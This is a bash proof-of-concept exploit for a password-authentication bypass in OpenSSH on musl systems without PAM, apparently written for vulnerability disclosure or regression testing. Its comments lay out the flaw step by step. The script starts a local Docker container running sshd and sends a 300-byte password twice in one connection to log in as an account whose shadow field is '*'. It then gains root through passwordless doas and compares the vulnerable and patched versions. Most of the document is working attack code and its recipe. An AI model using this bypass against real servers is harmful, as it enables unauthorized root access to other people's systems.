#!/usr/bin/env bash
# PoC: "sshhole" — OpenSSH password-auth bypass on musl systems
#
# An account whose /etc/shadow field is '*' accepts ANY password
# between 257 and 1024 bytes — but only on the 2nd+ prompt of a single
# SSH connection. Requires sshd built on musl, no PAM, password auth on,
# and one real-hashed account for pick_salt() to borrow a $6$ salt from.
#
# How it works (verified against pristine upstream source + live matrix):
#   sys_auth_passwd(): "*" shadow -> salt=NULL -> xcrypt(pw, NULL)
#   pick_salt(): scans getpwent()+getspnam() for the first $-style hash,
#     caches "$6$salt$" in a static buffer (per monitor child process),
#     and explicit_bzero()s musl's static spwd line buffer on its way.
#   crypt(257..1024B, "$6$salt$") on musl: sha512crypt hits KEY_MAX=256
#     and returns "*" instead of a hash.
#   Attempt 1: pick_salt scans -> bzero clobbers the shadow buffer
#     pw_password points into -> strcmp("*","") fails.
#   Attempt 2 (same connection): cache hit, no scan -> shadow_pw re-reads
#     "*" -> crypt->"*" -> strcmp("*","*")==0 -> AUTHENTICATED.
#
#   Fix (10.6p2): strlen(pw_password) >= 4 before strcmp — "*" is len 1.
#
# Requires: Docker and an OpenSSH client. The server runs in a local container.
set -euo pipefail
cd "$(dirname "$0")"

CTR=sshhole; IMG=sshhole
VER="${1:-10.6p1}"   # 10.6p1 = vulnerable, 10.6p2 = patched

case "$VER" in
  10.6p1|10.6p2) ;;
  *) echo "unsupported version: $VER" >&2; exit 2 ;;
esac

echo "[*] building image (cached after the first run)"
docker build --quiet -t "$IMG" lab/ >/dev/null

docker rm -f "$CTR" >/dev/null 2>&1 || true
docker run -d --name "$CTR" -p 127.0.0.1:2222:2222 "$IMG" >/dev/null
docker exec -d "$CTR" sh -c \
  "/opt/openssh-$VER/sbin/sshd -D -e -o LogLevel=VERBOSE -f /etc/ssh/sshd_config > /tmp/sshd.log 2>&1"

ready=0
for _ in $(seq 1 20); do
  if docker exec "$CTR" sh -c 'test -s /run/sshd.pid && kill -0 "$(cat /run/sshd.pid)"'; then
    ready=1
    break
  fi
  sleep 0.1
done
if [ "$ready" -ne 1 ]; then
  echo "sshd $VER failed to start" >&2
  docker exec "$CTR" sh -c 'cat /tmp/sshd.log' >&2 || true
  exit 1
fi

LONG=$(head -c 300 /dev/zero | tr '\0' 'A')
ROOT_COMMAND="doas sh -c 'echo __ROOT_OK__; id; whoami'"

ASKPASS=$(mktemp "${TMPDIR:-/tmp}/sshhole-askpass.XXXXXX")
trap 'rm -f "$ASKPASS"' EXIT HUP INT TERM
# SSHPASS expands when ssh runs this helper for each password prompt.
# shellcheck disable=SC2016
printf '#!/bin/sh\nprintf "%%s" "$SSHPASS"\n' > "$ASKPASS"
chmod 700 "$ASKPASS"

echo "=== target: OpenSSH $VER on Alpine/musl, no PAM, :2222 ==="
echo "    alpine has a '*' shadow field and passwordless doas"
echo "    alice provides a real \$6\$ salt"
echo

attempt() {
  SSHPASS="$LONG" SSH_ASKPASS="$ASKPASS" SSH_ASKPASS_REQUIRE=force DISPLAY=x \
    ssh -F /dev/null -p 2222 \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      -o NumberOfPasswordPrompts="$1" -o ConnectTimeout=5 -o LogLevel=ERROR \
      alpine@127.0.0.1 "$ROOT_COMMAND" </dev/null 2>&1
}

echo "[*] one prompt: the salt cache is cold"
if attempt 1 >/dev/null; then
  echo "[!] unexpected authentication on the first prompt" >&2
  exit 1
fi
echo "[-] denied"

echo "[*] two prompts on one connection: same 300-byte password twice"
root_shell=0
if out=$(attempt 2) && printf '%s' "$out" | grep -q __ROOT_OK__; then
  root_shell=1
  echo "[+] root shell through alpine + doas:"
  printf '%s\n' "$out" | sed -n '/^__ROOT_OK__$/,$p' | sed '1d'
else
  echo "[-] denied"
fi

if { [ "$VER" = 10.6p1 ] && [ "$root_shell" -ne 1 ]; } ||
   { [ "$VER" = 10.6p2 ] && [ "$root_shell" -ne 0 ]; }; then
  echo "unexpected result for OpenSSH $VER" >&2
  exit 1
fi

echo
echo "--- sshd auth decisions ---"
docker exec "$CTR" sh -c 'grep -E "Accepted|Failed" /tmp/sshd.log' || true
